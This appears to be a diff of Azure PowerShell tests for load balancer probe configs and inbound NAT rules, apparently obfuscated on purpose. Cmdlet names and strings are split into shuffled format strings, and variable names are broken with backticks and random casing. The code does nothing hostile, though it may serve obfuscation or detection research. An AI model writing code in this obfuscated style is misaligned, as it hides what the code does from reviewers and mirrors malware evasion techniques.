+        &("{1}{2}{0}" -f'e','Ass','ert-Tru') { &("{5}{2}{0}{1}{4}{3}"-f'l','et','heck-Cmd','eturnType','R','C') ("{6}{1}{7}{4}{2}{8}{3}{0}{5}"-f'C','ew-AzLoadBa','rPr','e','nce','onfig','N','la','ob') ${Vpr`o`BE} };
+        ${v`LOadbAL`A`NCEr} = &("{2}{1}{3}{0}" -f 'lancer','ew-AzLo','N','adBa') -ResourceGroupName ${R`gnaME} -Name ${rN`AMe} -Probe ${vp`Robe} -FrontendIPConfiguration ${FRO`N`TeNdiPCoNfIGU`R`ATIon} -Location ${l`OCA`TIoN};
+        &("{2}{1}{0}{3}" -f 'ot','-N','Assert','Null') ${vlOA`Db`ALa`N`cer};
+        &("{0}{2}{1}{3}" -f'Ass','q','ert-AreE','ual') ${R`NAME} ${V`P`RObe}."nA`me";
+        &("{1}{3}{0}{2}{4}" -f'ert-A','As','reEq','s','ual') ${PROtOC`ol} ${v`pr`obE}."P`RoTo`Col";
+        &("{2}{4}{3}{1}{0}"-f 'l','t-AreEqua','A','ser','s') ${P`ORT} ${VPrO`BE}."P`ORT";
+        &("{2}{0}{3}{4}{1}"-f 'e','Equal','Ass','rt','-Are') ${IN`TEr`Va`LINsE`CoNdS} ${VpRO`BE}."I`Nt`e`R`VaLinSECOnds";
+        &("{0}{2}{1}" -f'Ass','reEqual','ert-A') ${PROb`Eco`Unt} ${vP`R`obE}."nUMbE`R`O`FpRobes";
+        &("{4}{0}{2}{3}{1}" -f's','ual','sert','-AreEq','A') ${REqUEstp`A`TH} ${V`ProBE}."r`eQUE`StpATH";
+
+        
+        ${v`PR`Obe} = &("{7}{2}{6}{5}{1}{3}{4}{0}" -f'Config','Balancer','-','P','robe','d','AzLoa','Get') -LoadBalancer ${vLOA`DbaLaN`cER} -Name ${R`NaMe};
+        &("{1}{2}{3}{4}{0}"-f 'l','As','sert-No','tN','ul') ${v`p`RoBE};
+        &("{2}{3}{0}{1}" -f 'Tru','e','Asse','rt-') { &("{4}{1}{2}{5}{0}{3}" -f 'nTy','etR','e','pe','Check-Cmdl','tur') ("{2}{5}{1}{0}{4}{3}{6}"-f'adBalance','-AzLo','Ge','robe','rP','t','Config') ${vP`Ro`Be} };
+        &("{0}{1}{3}{2}"-f'As','s','al','ert-AreEqu') ${RN`A`ME} ${v`pRobE}."n`AMe";
+        &("{2}{0}{3}{1}" -f 'sert-AreE','l','As','qua') ${PrOT`o`coL} ${v`PRoBE}."p`RoTOC`ol";
+        &("{2}{0}{1}{3}"-f'r','eEqu','Assert-A','al') ${pO`RT} ${V`ProBE}."P`Ort";
+        &("{0}{2}{3}{1}"-f'Ass','l','er','t-AreEqua') ${In`T`ErVALINsEcon`DS} ${VpR`O`Be}."inte`R`Va`LINsE`Co`NdS";
+        &("{2}{3}{0}{1}"-f'a','l','As','sert-AreEqu') ${pR`OBECOu`Nt} ${Vp`R`Obe}."NuM`Ber`oFPro`BeS";
+        &("{3}{2}{0}{1}{4}" -f 'reE','qua','rt-A','Asse','l') ${R`EQu`EsTP`AtH} ${VPR`ObE}."re`QuEs`Tp`ATH";
+
+        
+        ${LisT`pR`obE} = &("{3}{2}{1}{4}{0}{6}{5}"-f 'ob','dBala','et-AzLoa','G','ncerPr','ig','eConf') -LoadBalancer ${vLoA`DBA`lAN`cEr};
+        &("{1}{2}{0}"-f'Null','Assert-N','ot') (${LisT`P`RO`Be} | &("{3}{0}{1}{2}" -f'O','bjec','t','Where-') { ${_}."N`AMe" -eq ${R`NaME} });
+
+        
+        ${v`LoadbAlAnc`Er} = &("{6}{2}{3}{8}{0}{5}{7}{4}{1}"-f 'a','nfig','t-AzL','oa','obeCo','ncerP','Se','r','dBal') -Name ${rNA`Me} -LoadBalancer ${vLOaD`BalaN`Cer} -Protocol ${pRoT`OCO`l`SeT} -Port ${poRt`S`ET} -IntervalInSeconds ${INTEr`V`ALiN`s`ecOn`ds`sEt} -ProbeCount ${Pr`oBEC`OUn`T`Set};
+        &("{1}{0}{3}{2}" -f'e','Ass','Null','rt-Not') ${v`loAd`BalAnC`er};
+        ${VL`o`AdB`AlAnCER} = &("{0}{1}{5}{4}{2}{3}" -f 'Set-Az','Lo','al','ancer','dB','a') -LoadBalancer ${VLO`ADBA`L`An`CeR};
+        &("{2}{0}{3}{1}"-f 't-Not','ll','Asser','Nu') ${V`LoA`D`BAlAncer};
+
+        
+        ${V`Pr`oBE} = &("{6}{1}{0}{5}{3}{2}{4}" -f'nce','AzLoadBala','eC','Prob','onfig','r','Get-') -LoadBalancer ${vloA`D`BaLA`Nc`eR} -Name ${rn`A`Me};
+        &("{2}{0}{3}{4}{1}"-f'rt-','tNull','Asse','N','o') ${V`pRobe};
+        &("{1}{2}{0}"-f 'ert-True','As','s') { &("{5}{2}{4}{6}{1}{3}{0}" -f 'pe','tu','heck-','rnTy','Cmdle','C','tRe') ("{4}{5}{3}{6}{7}{1}{2}{0}" -f 'ig','ProbeC','onf','dBa','Ge','t-AzLoa','lanc','er') ${VP`R`obe} };
+        &("{3}{2}{0}{1}{4}"-f'r','t-A','e','Ass','reEqual') ${RnA`mE} ${vp`R`oBe}."nA`Me";
+        &("{2}{3}{0}{1}" -f 'Equa','l','Asse','rt-Are') ${P`R`oToc`OLsEt} ${V`prO`BE}."PRo`ToC`ol";
+        &("{1}{2}{3}{0}" -f 'qual','Asser','t-Are','E') ${PorT`S`ET} ${V`probe}."Po`Rt";
+        &("{2}{3}{1}{0}" -f'Equal','e','Assert-A','r') ${Int`E`RvALINS`ec`O`NDsS`ET} ${vpRO`BE}."INT`ErVAli`N`Secon`ds";
+        &("{1}{0}{4}{3}{2}" -f'ss','A','qual','t-AreE','er') ${pro`B`EC`oun`TsEt} ${vpRO`Be}."NuM`BERo`FPRo`Bes";
+
+        
+        ${L`IsT`ProbE} = &("{2}{3}{1}{4}{0}" -f'fig','erProb','Get-AzLoadBalan','c','eCon') -LoadBalancer ${VLo`ADB`A`LA`NCEr};
+        &("{0}{2}{1}" -f 'Asse','-NotNull','rt') (${LiST`PrO`BE} | &("{0}{1}{2}"-f'Where','-Obj','ect') { ${_}."Na`ME" -eq ${r`N`AMe} });
+
+        
+        ${V`l`Oa`DbaLaN`ceR} = &("{5}{3}{1}{6}{0}{7}{4}{2}"-f'a','AzLoadBa','robeConfig','dd-','cerP','A','l','n') -Name ${RN`Am`EaDd} -LoadBalancer ${vL`oAdba`LaN`Cer} -Port ${Por`TAdd} -IntervalInSeconds ${i`N`TeRva`LiN`s`ECONDSa`Dd} -ProbeCount ${Pr`ObeCo`UN`T`ADd};
+        &("{0}{3}{1}{2}" -f'Asse','NotNu','ll','rt-') ${vloaDB`AlAN`C`er};
+        ${v`loADB`AlaNCer} = &("{0}{2}{1}{4}{3}{5}"-f 'S','Lo','et-Az','B','ad','alancer') -LoadBalancer ${V`Lo`ADBaLaNcER};
+        &("{0}{1}{2}"-f'A','ssert-N','otNull') ${VL`OADbALA`N`CER};
+
+        
+        ${vpr`O`BE} = &("{3}{0}{6}{4}{1}{5}{2}" -f 'la','ob','ig','Get-AzLoadBa','r','eConf','ncerP') -LoadBalancer ${vL`OA`DbAlaN`CER} -Name ${RName`A`dD};
+        &("{1}{0}{3}{2}" -f 'ser','As','NotNull','t-') ${v`PR`obe};
+        &("{1}{3}{2}{0}"-f'rt-True','As','e','s') { &("{3}{0}{1}{4}{5}{2}" -f'k-Cmdl','etRe','e','Chec','tur','nTyp') ("{2}{8}{0}{4}{3}{5}{7}{6}{1}"-f 'AzLoad','onfig','Ge','ala','B','n','C','cerProbe','t-') ${v`prOBE} };
+        &("{3}{0}{2}{1}" -f'ser','reEqual','t-A','As') ${RnA`ME`Add} ${Vp`Ro`BE}."na`me";
+        &("{1}{0}{2}{3}{4}"-f 'er','Ass','t-A','re','Equal') ${PO`RT`Add} ${VPRO`Be}."P`ORT";
+        &("{0}{2}{1}"-f'Ass','l','ert-AreEqua') ${i`Nt`Erva`l`InSECOnDsA`Dd} ${v`pR`ObE}."In`TERVAlINse`c`onDS";
+        &("{1}{2}{0}" -f'Equal','Asse','rt-Are') ${Pr`O`BECOun`TAdd} ${vP`RobE}."NuMBe`Ro`FPr`obeS";
+
+        
+        ${L`is`TprO`BE} = &("{5}{6}{0}{3}{7}{2}{1}{4}" -f'-AzLo','beConfi','ro','adBalancer','g','G','et','P') -LoadBalancer ${v`LOAdBAlA`N`c`ER};
+        &("{3}{1}{0}{2}" -f 't','er','-NotNull','Ass') (${lIstP`R`oBE} | &("{2}{1}{3}{0}"-f 't','ere','Wh','-Objec') { ${_}."Na`Me" -eq ${RNA`M`eaDd} });
+
+        
+        &("{2}{4}{1}{6}{3}{0}{5}"-f 'ta','rt-','A','Con','sse','ins','Throws') { &("{1}{6}{5}{3}{2}{4}{0}"-f'Config','Add-','ancerProb','al','e','oadB','AzL') -Name ${R`N`AMEAdD} -LoadBalancer ${Vl`oAD`Balan`cER} -Port ${poRt`ADd} -IntervalInSeconds ${i`NTerVA`lI`NSe`conDsaDD} -ProbeCount ${p`R`ob`ECou`NtadD} } ("{2}{1}{0}{3}{4}"-f 'ady','re','al',' ex','ists');
+
+        
+        ${VLoA`DbalANc`Er} = &("{0}{7}{1}{6}{4}{5}{2}{3}"-f'Rem','A','f','ig','e','rProbeCon','zLoadBalanc','ove-') -LoadBalancer ${Vlo`ADBaL`Anc`eR} -Name ${R`NAm`E`ADD};
+        ${vLoa`dbalAn`cer} = &("{1}{0}{6}{4}{5}{2}{3}" -f 'e-AzLoadBal','Remov','robeC','onfig','nce','rP','a') -LoadBalancer ${vlo`A`DBaLA`N`cEr} -Name ${R`Name};
+        
+        ${v`LOa`dBALA`NceR} = &("{7}{3}{4}{2}{5}{0}{6}{1}" -f'alancer','onfig','Loa','em','ove-Az','dB','ProbeC','R') -LoadBalancer ${vLo`Ad`BaL`ANCer} -Name ${rNa`Me};
+        
+        ${vLOadb`ALa`NCEr} = &("{2}{1}{3}{0}" -f 'r','AzL','Set-','oadBalance') -LoadBalancer ${VlOa`dBA`Lan`cer};
+        &("{3}{2}{4}{0}{1}"-f '-N','otNull','ser','As','t') ${vlo`A`d`BaLANCEr};
+
+        
+        &("{1}{0}{4}{3}{5}{2}{6}"-f 'sse','A','a','T','rt-','hrowsCont','ins') { &("{1}{2}{3}{0}{4}" -f 'er','G','et','-AzLoadBalanc','ProbeConfig') -LoadBalancer ${vLO`Adb`AL`Anc`Er} -Name ${RnA`me} } ("{2}{3}{6}{7}{1}{4}{0}{5}{8}{9}" -f'a','n','S','equence contain','o m','tching ele','s',' ','me','nt');
+
+        
+        &("{5}{3}{1}{2}{0}{4}" -f'wsConta','hr','o','ert-T','ins','Ass') { &("{1}{2}{4}{5}{3}{0}" -f'rProbeConfig','Set','-A','nce','zL','oadBala') -Name ${rn`A`Me} -LoadBalancer ${vlo`AD`BaL`ANc`Er} -Protocol ${pR`ot`o`cOlSeT} -Port ${po`RtS`et} -IntervalInSeconds ${inTErvaL`i`NS`E`conDS`seT} -ProbeCount ${P`RObe`Cou`NTS`ET} } ("{2}{3}{4}{0}{1}" -f't exis','t','d','oes ','no');
+    }
+    finally
+    {
+        
+        &("{0}{5}{1}{3}{2}{4}"-f'C','so','eG','urc','roup','lean-Re') ${Rg`NamE};
+    }
+}
+
+
+function TEST-i`NBoUNdNATRuLEcruDmI`N`i`maLpa`RAM`ETErs
+{
+    
+    ${r`GN`AME} = &("{5}{1}{0}{4}{3}{2}"-f'so','t-Re','me','roupNa','urceG','Ge');
+    ${RgLo`c`A`TIoN} = &("{1}{3}{2}{0}"-f'n','Get-Pro','derLocatio','vi') ("{1}{4}{0}{2}{5}{3}"-f'ourceMa','Re','nagem','nt','s','e');
+    ${R`NaMe} = &("{4}{0}{1}{3}{2}" -f '-R','esourc','me','eNa','Get');
+    ${RnaME`ADd} = "${rname}Add";
+    ${L`oCat`Ion} = &("{1}{2}{3}{5}{0}{6}{4}" -f 'iderLo','Get-','Pr','o','ion','v','cat') ("{4}{1}{3}{0}{2}{5}"-f'soft.','icr','Network/lo','o','M','adBalancers');
+    
+    ${FROntEn`dp`o`Rt} = 123;
+    ${B`ACk`enDpoRt} = 456;
+    
+    ${fro`NTeN`DP`Ort`seT} = 128;
+    ${bAck`e`N`dpOr`TSeT} = 500;
+    
+    ${F`RONT`E`NDpORtADD} = 80;
+    ${b`AcKENDpo`R`TADD} = 512;
+    
+    ${sUb`Ne`Tn`AmE} = ("{1}{0}{2}" -f 'bnetNam','Su','e');
+    ${s`U`Bnet`AD`dR`ESsPre`Fix} = ("{3}{1}{0}{2}" -f'0.1','0.','.0/24','1');
+    ${V`iRtUaLN`etw`O`Rkna`Me} = ("{4}{2}{1}{0}{3}"-f'Na','k','Networ','me','Virtual');
+    ${vi`RtUa`LNe`TWoRK`AD`DREssPrefIx} = @(("{0}{2}{3}{1}"-f '10.0','.0/8','.','0'));
+    ${FR`O`Nt`eNdi`pcONf`i`gURatiONNa`mE} = ("{0}{2}{3}{4}{1}"-f'Frontend','rationName','I','P','Configu');
+
+    try
+    {
+        ${R`eSOURc`EgRo`Up} = &("{1}{2}{0}{3}"-f 'rce','New-AzRe','sou','Group') -Name ${Rg`N`AmE} -Location ${r`glOcAtI`ON};
+
+        
+        ${Su`B`NeT} = &("{0}{1}{5}{6}{3}{2}{4}"-f 'New-AzV','ir','etw','alN','orkSubnetConfig','t','u') -Name ${sU`Bn`E`TnAMe} -AddressPrefix ${SuBNe`TaD`DReS`sP`REFix};
+        ${virtU`ALneT`Wo`Rk} = &("{6}{5}{1}{4}{3}{0}{2}" -f 'alNet','zVi','work','tu','r','-A','New') -ResourceGroupName ${r`Gna`ME} -Location ${loCaT`i`on} -Name ${Vir`T`UALn`ETwor`Kn`AMe} -Subnet ${sub`NEt} -AddressPrefix ${Vir`Tu`ALnE`T`WOrkaD`drESSprEF`IX};
+        if(-not ${SU`BnET}."I`D")
+        {
+            ${s`UbNEt} = &("{4}{1}{2}{5}{7}{3}{0}{6}" -f'netCon','et-Az','V','NetworkSub','G','irtua','fig','l') -Name ${S`UBNe`T`Name} -VirtualNetwork ${VIrtu`ALNE`T`wOrk};
+        }
+        ${fr`ONtE`NDiPc`on`Fi`GurAT`iON} = &("{6}{5}{0}{3}{9}{1}{2}{8}{4}{7}" -f 'rF','ntend','IpCo','r','f','w-AzLoadBalance','Ne','ig','n','o') -Name ${F`ROnT`ENDI`pconfIG`U`RAtIONnAMe} -Subnet ${sU`BNet};
+
+        
+        ${Vi`NBoUnD`NA`T`RUle} = &("{0}{6}{1}{4}{3}{8}{11}{7}{2}{10}{9}{5}" -f'Ne','a','a','Balance','d','uleConfig','w-AzLo','dN','rInbo','R','t','un') -Name ${RN`A`me} -FrontendIpConfiguration ${f`R`ONtEn`DIpc`onfIgUR`ATI`On} -FrontendPort ${fROnT`EN`d`PoRT} -BackendPort ${BAC`KENDP`O`Rt};
+        &("{0}{2}{1}{3}"-f'Asse','t-No','r','tNull') ${vinbOU`N`DnATR`ULe};
+        &("{0}{2}{1}"-f 'Ass','e','ert-Tru') { &("{0}{5}{2}{6}{4}{1}{3}" -f'Check','u','md','rnType','Ret','-C','let') ("{1}{2}{0}{3}{4}{6}{5}"-f'erInb','New-AzLo','adBalanc','ound','NatRuleC','fig','on') ${vI`NbO`U`NDNATRUle} };
+        ${vL`oadBA`L`ANcEr} = &("{3}{0}{2}{1}"-f'L','adBalancer','o','New-Az') -ResourceGroupName ${rG`N`AMe} -Name ${R`Na`ME} -InboundNatRule ${vINbO`Un`dn`AtR`U`lE} -FrontendIPConfiguration ${fROn`TEnD`ip`c`OnfIG`URa`TiON} -Location ${lOc`AtION};
+        &("{2}{4}{0}{3}{1}" -f't-','otNull','A','N','sser') ${v`LoAdbalA`NCER};
+        &("{3}{2}{0}{1}{4}"-f't-NotN','u','er','Ass','ll') ${v`LoA`dbalANc`Er}."FR`oN`TeNd`ip`cONFIgURA`TI`ONs";
+        &("{1}{0}{2}"-f 'sert-T','As','rue') { ${VLoad`Bala`NC`ER}."f`R`ON`TEn`dIPco`NfIguRa`T`ionS"."l`eNGTh" -gt 0 };
+        &("{4}{0}{1}{2}{3}"-f'sert-','Are','Equa','l','As') ${rn`AmE} ${vInBou`N`d`NA`T`RUle}."n`AME";
+        &("{3}{0}{2}{1}"-f'sert-A','l','reEqua','As') ${fR`ONTeNdPO`Rt} ${VINbo`U`Nd`Na`Tr`ULe}."f`RONtEND`porT";
+        &("{1}{2}{3}{4}{0}"-f 'Equal','As','s','ert-','Are') ${Bac`K`eN`DpOrt} ${vi`NBo`Un`dnatRUlE}."b`AcK`e`NDPoRT";
+
+        
+        ${V`iNBoU`NdNAt`RULe} = &("{6}{1}{0}{3}{10}{8}{4}{2}{9}{5}{7}"-f 'a','t-AzLo','n','d','erInbou','Con','Ge','fig','lanc','dNatRule','Ba') -LoadBalancer ${V`lO`Adba`L`AnCER} -Name ${r`NaMe};
+        &("{0}{3}{1}{2}" -f'Ass','NotNu','ll','ert-') ${vinb`ouN`DNATRU`le};
+        &("{2}{1}{0}" -f 't-True','er','Ass') { &("{1}{5}{6}{2}{4}{3}{0}"-f 'Type','C','l','tReturn','e','heck-C','md') ("{10}{6}{9}{5}{4}{2}{1}{8}{3}{7}{0}"-f'nfig','ul','rInboundNatR','C','e','alanc','et-','o','e','AzLoadB','G') ${ViN`BOUnDnaT`RULe} };
+        &("{3}{1}{0}{2}" -f'ert-AreEqu','s','al','As') ${RN`A`Me} ${V`i`Nbou`N`dnaTrULe}."nA`me";
+        &("{1}{0}{2}{3}" -f'ert-AreEq','Ass','u','al') ${Fro`NTen`D`pO`Rt} ${V`inb`OuN`DNAtrule}."fROnteN`DPO`RT";
+        &("{2}{0}{1}{3}"-f 'ssert-Ar','eE','A','qual') ${ba`CKenDpo`Rt} ${V`InbOunDna`T`RulE}."bAcK`en`DPoRT";
+
+        
+        ${LisTInbOu`NDn`ATr`ULE} = &("{3}{5}{6}{1}{0}{4}{2}" -f 'nboun','oadBalancerI','leConfig','G','dNatRu','et-Az','L') -LoadBalancer ${vlo`Adb`ALAn`C`ER};
+        &("{0}{4}{2}{1}{3}" -f'Ass','otNul','N','l','ert-') (${lis`T`iNb`O`U`NDnatRU`Le} | &("{1}{2}{0}{3}"-f'ere-Ob','W','h','ject') { ${_}."nA`me" -eq ${Rn`Ame} });
+
+        
+        ${VL`o`ADBa`LAnc`er} = &("{3}{0}{7}{5}{6}{8}{10}{4}{2}{1}{9}" -f '-','NatRuleC','nd','Set','u','zLoadBa','l','A','ancerIn','onfig','bo') -Name ${rN`AMe} -LoadBalancer ${VlO`A`DBaLA`NCer} -FrontendIpConfiguration ${FrOn`TEnDI`PCOnFIGU`R`At`ioN} -FrontendPort ${fRO`N`T`EndPort`SET} -BackendPort ${baCKendp`oR`T`Set};
+        &("{2}{1}{0}{3}"-f '-No','ert','Ass','tNull') ${vlo`A`DBa`LAnCer};
+        ${Vl`O`AdbaLa`NcEr} = &("{3}{1}{2}{0}" -f'er','adBa','lanc','Set-AzLo') -LoadBalancer ${V`loadba`LanCEr};
+        &("{2}{1}{0}{3}" -f'otN','rt-N','Asse','ull') ${VlOAdB`ALA`N`cER};
+
+        
+        ${vI`N`BouN`DnAtrUle} = &("{3}{2}{9}{8}{1}{4}{5}{0}{6}{7}" -f 'u','bo','AzL','Get-','undNat','R','leCon','fig','ncerIn','oadBala') -LoadBalancer ${V`LOA`DbalaNC`ER} -Name ${rna`ME};
+        &("{2}{0}{4}{3}{1}"-f'ot','l','Assert-N','ul','N') ${vIN`BOunD`NatrUle};
+        &("{2}{0}{1}"-f'r','t-True','Asse') { &("{1}{0}{3}{2}" -f'c','Che','letReturnType','k-Cmd') ("{0}{7}{2}{10}{3}{8}{9}{4}{6}{5}{1}" -f'Ge','g','zLo','ancerI','le','fi','Con','t-A','nb','oundNatRu','adBal') ${VINB`oundnaTRU`LE} };
+        &("{3}{1}{4}{0}{2}" -f'a','ssert-AreE','l','A','qu') ${RN`AMe} ${vINB`oU`Ndn`Atr`Ule}."na`ME";
+        &("{2}{1}{3}{4}{0}"-f'al','er','Ass','t-Ar','eEqu') ${F`RON`T`En`dPORtsEt} ${vInbo`UNdNa`T`RUle}."fRonT`END`pO`RT";
+        &("{0}{2}{1}{3}" -f 'A','rt','sse','-AreEqual') ${bA`CkeN`dPORtsEt} ${V`InBounD`Na`Tr`UlE}."B`A`CkENDP`oRT";
+
+        
+        ${LiSTiNBo`UnDn`ATr`ULe} = &("{4}{6}{1}{2}{3}{5}{0}" -f'ig','dN','atR','uleC','Get-A','onf','zLoadBalancerInboun') -LoadBalancer ${vl`oAd`BA`laNc`eR};
+        &("{0}{1}{2}{3}" -f 'Asser','t-No','tNu','ll') (${L`iST`In`BOunDn`AT`RULE} | &("{1}{0}{2}"-f'O','Where-','bject') { ${_}."Na`me" -eq ${rnA`ME} });
+
+        
+        ${vloAd`Bala`NCEr} = &("{6}{1}{5}{0}{2}{4}{3}" -f'LoadBalancerInboundN','A','atR','eConfig','ul','z','Add-') -Name ${rnA`MeA`DD} -LoadBalancer ${vl`o`Ad`BalANceR} -FrontendIpConfiguration ${Fro`NteND`i`pCON`FI`GURAtI`ON} -FrontendPort ${F`ROnTenD`Po`RT`A`Dd} -BackendPort ${bac`KenD`PORt`Add};
+        &("{2}{3}{4}{0}{1}"-f'NotN','ull','A','s','sert-') ${VL`O`ADbaLaNc`ER};
+        ${Vl`oAdBa`lANcER} = &("{3}{4}{0}{2}{1}"-f 'LoadBalan','er','c','Set','-Az') -LoadBalancer ${v`LoaD`BalAnc`ER};
+        &("{2}{1}{3}{0}"-f'll','sert-','As','NotNu') ${vlOAdb`A`LA`N`CEr};
+
+        
+        ${V`InB`oun`dnAtR`ULe} = &("{2}{3}{4}{5}{0}{6}{1}" -f'dN','fig','Get-AzLoad','Bala','ncerInbou','n','atRuleCon') -LoadBalancer ${vLOA`dbA`LaN`CEr} -Name ${RnAmEA`dd};
+        &("{3}{0}{1}{2}" -f'sse','rt-N','otNull','A') ${vIn`BOuNd`Na`TRU`lE};
+        &("{3}{0}{2}{1}" -f 'sert','ue','-Tr','As') { &("{0}{2}{3}{1}{4}"-f 'Ch','Typ','eck-','CmdletReturn','e') ("{1}{7}{4}{8}{5}{2}{10}{9}{3}{0}{6}"-f'o','G','n','leC','-AzLo','a','nfig','et','adBal','boundNatRu','cerIn') ${V`INBoUN`dnaTRULe} };
+        &("{0}{1}{2}" -f'As','sert-AreEqu','al') ${RNA`MEADD} ${VI`Nb`OUnDNAt`RULe}."NA`Me";
+        &("{0}{2}{3}{1}"-f'Ass','l','ert-A','reEqua') ${frOntE`Nd`P`O`RtAdd} ${vINBOun`DNa`T`Ru`LE}."frO`N`T`eNdpoRT";
+        &("{4}{3}{1}{2}{0}"-f 'l','E','qua','sert-Are','As') ${ba`CKE`NDportaDd} ${V`iNB`oUNdNa`TrUlE}."b`A`CKeNdpoRT";
+
+        
+        ${LI`sTI`N`BO`UNd`NATRULe} = &("{6}{2}{1}{3}{9}{7}{8}{4}{5}{0}" -f 'ig','oadBalan','-AzL','ce','NatRul','eConf','Get','ou','nd','rInb') -LoadBalancer ${VLoA`DB`AlA`NCER};
+        &("{1}{3}{0}{2}" -f 'tNul','Asser','l','t-No') (${lI`STi`N`BOu`NDN`AtrulE} | &("{3}{1}{0}{2}" -f 're-Obje','e','ct','Wh') { ${_}."NA`mE" -eq ${RN`AM`e`ADD} });
+
+        
+        &("{3}{5}{2}{1}{0}{4}"-f'owsContain','hr','T','Ass','s','ert-') { &("{3}{1}{2}{0}{7}{5}{4}{6}"-f'lancerI','-AzLoadB','a','Add','atRuleCon','oundN','fig','nb') -Name ${rnAm`E`ADd} -LoadBalancer ${VL`O`AdBal`A`NceR} -FrontendIpConfiguration ${fROnt`eNdiPConf`iG`URAt`I`ON} -FrontendPort ${Fro`NTe`N`Dpo`RTAdd} -BackendPort ${Bac`KENDPOR`TaDD} } ("{3}{2}{4}{1}{0}"-f 's','exist','d','alrea','y ');
+
+        
+        ${V`lOadbalA`Nc`ER} = &("{6}{1}{4}{9}{11}{7}{0}{3}{2}{12}{10}{5}{8}" -f'un','ve-AzLo','Na','d','a','nfi','Remo','bo','g','dBalan','Co','cerIn','tRule') -LoadBalancer ${v`L`OadBal`ANC`eR} -Name ${rN`AmEA`DD};
+        ${v`L`OADb`ALAN`cer} = &("{7}{9}{1}{5}{4}{11}{3}{2}{6}{10}{8}{0}"-f 'g','e','e','c','oadBa','-AzL','rInb','Re','NatRuleConfi','mov','ound','lan') -LoadBalancer ${v`LOADb`ALa`NCEr} -Name ${r`NaMe};
+        
+        ${vl`O`ADBAl`AN`CER} = &("{3}{4}{1}{2}{0}{6}{5}{7}"-f'und','Bal','ancerInbo','Remove-','AzLoad','ul','NatR','eConfig') -LoadBalancer ${vLOA`d`BA`laNc`ER} -Name ${R`Na`mE};
+        
+        ${V`LOADb`AlA`Ncer} = &("{4}{1}{3}{5}{0}{2}" -f'ad','et','Balancer','-','S','AzLo') -LoadBalancer ${vlo`A`dba`laNC`eR};
+        &("{0}{1}{2}" -f'Assert','-NotNul','l') ${vloa`DBAL`AnC`ER};
+
+        
+        &("{4}{3}{2}{1}{5}{0}"-f'ntains','-Throw','t','ser','As','sCo') { &("{3}{0}{6}{1}{5}{4}{2}"-f 't-AzLo','a','leConfig','Ge','NatRu','ncerInbound','adBal') -LoadBalancer ${VlOaD`BaL`ANcer} -Name ${rN`AmE} } ("{7}{4}{5}{1}{2}{3}{6}{0}"-f'nt','ntains no matc','hing e','le','quenc','e co','me','Se');
+
+        
+        &("{0}{3}{2}{1}{4}{5}"-f'Asser','sC','Throw','t-','on','tains') { &("{1}{6}{8}{4}{0}{2}{7}{3}{5}" -f'undN','S','atR','n','lancerInbo','fig','et-Az','uleCo','LoadBa') -Name ${R`NA`ME} -LoadBalancer ${VL`OAD`BAlANC`eR} -FrontendIpConfiguration ${Fro`NTe`NDiPConfig`Ura`TiOn} -FrontendPort ${FRO`NTen`DpoRt`SeT} -BackendPort ${b`Ac`KeNdpOR`Ts`eT} } ("{1}{3}{0}{2}"-f 's not','d',' exist','oe');
+    }
+    finally
+    {
+        
+        &("{1}{4}{2}{0}{3}"-f'Resourc','C','-','eGroup','lean') ${r`Gn`Ame};
+    }
+}
+
+
+function TeSt-`INbo`UNdN`ATruL`EcrudALLPAR`A`Meters
+{
+    
+    ${RgnA`ME} = &("{2}{6}{5}{0}{3}{4}{1}" -f'urceG','ame','Ge','r','oupN','Reso','t-');
+    ${RgL`oc`At`Ion} = &("{4}{2}{5}{0}{3}{1}"-f 'r','tion','v','Loca','Get-Pro','ide') ("{0}{3}{1}{2}"-f 'Resour','eManagemen','t','c');
+    ${rN`AME} = &("{1}{4}{3}{2}{0}" -f'rceName','Get','sou','Re','-');
+    ${RnAm`ea`dd} = "${rname}Add";
+    ${lOCAt`i`on} = &("{4}{5}{1}{2}{3}{6}{0}"-f 'n','i','derLo','ca','Get-','Prov','tio') ("{1}{4}{9}{0}{8}{5}{2}{7}{6}{3}" -f'of','Mi','ork/l','ers','cro','etw','Balanc','oad','t.N','s');
+    
+    ${Pro`T`oCol} = "Udp";
+    ${F`R`ONTEndp`OrT} = 123;
+    ${bAcKEn`dpo`Rt} = 456;
+    ${idL`ETImE`ouT`InmI`NuTeS} = 7;
+    ${E`Na`BlE`F`L`OATiNgIP} = ${Tr`Ue};
+    ${E`NA`BL`E`TcpReSET} = ${F`ALse};
+    
+    ${PR`OTocOls`et} = "Tcp";
+    ${fRO`NT`eNdp`OrtseT} = 128;
+    ${ba`ck`e`NdPO`RtsEt} = 500;
+    ${iDl`ETim`eOuTiNmIN`UTEs`SeT} = 15;
+    ${E`Na`Bl`E`F`LoatI`NgIpSet} = ${fa`LSe};
+    ${E`NaBlE`TcPr`eSE`TS`eT} = ${f`A`lSe};
+    
+    ${PRot`OCo`l`Add} = "Tcp";
+    ${fRoNtEN`d`pORt`ADD} = 80;
+    ${BA`ckE`NDPORTA`dD} = 512;
+    ${Idl`ETim`EoutInM`IN`Ut`EsA`dD} = 17;
+    ${EN`Ab`lEflo`Atin`GIP`A`DD} = ${F`A`lse};
+    ${EN`AbL`eTCP`ReSe`TAdD} = ${F`AlSe};
+    
+    ${s`U`BnEtnAme} = ("{0}{2}{1}" -f 'Subnet','me','Na');
+    ${SuB`NeTADDr`Es`s`PrEfix} = ("{3}{2}{0}{1}"-f '.0','.1.0/24','0','1');
+    ${vi`RtU`AL`NE`TWorkNAMe} = ("{4}{2}{0}{3}{5}{1}"-f 'tw','e','tualNe','or','Vir','kNam');
+    ${virTUaL`NET`wor`KaD`DR`e`SspRefIX} = @(("{0}{1}{2}" -f '10.0.0','.','0/8'));
+    ${FR`on`TeNDipcONfiguR`AtIO`NnaMe} = ("{0}{2}{1}{3}{4}" -f 'Fronten','IPConf','d','igurationNa','me');
+
+    try
+    {
+        ${ReS`OuRCeGR`o`Up} = &("{2}{3}{4}{1}{0}{5}"-f 'urce','o','New-','AzR','es','Group') -Name ${R`GnA`Me} -Location ${rGLOC`ATI`ON};
+
+        
+        ${S`U`BNET} = &("{1}{6}{3}{5}{2}{4}{0}{7}" -f 'bnetConf','New','rk','tw','Su','o','-AzVirtualNe','ig') -Name ${sUB`NetN`A`ME} -AddressPrefix ${s`Ub`NEt`ADdrESSprEfix};
+        ${vIrT`U`A`Lnet`woRk} = &("{0}{1}{3}{2}{4}{5}" -f'New','-AzV','rtu','i','alNet','work') -ResourceGroupName ${Rg`N`AMe} -Location ${L`ocatioN} -Name ${V`I`RtuA`LNETwO`RKnAME} -Subnet ${SU`BN`ET} -AddressPrefix ${VIRTu`ALneT`woRKa`D`dRESspreFIX};
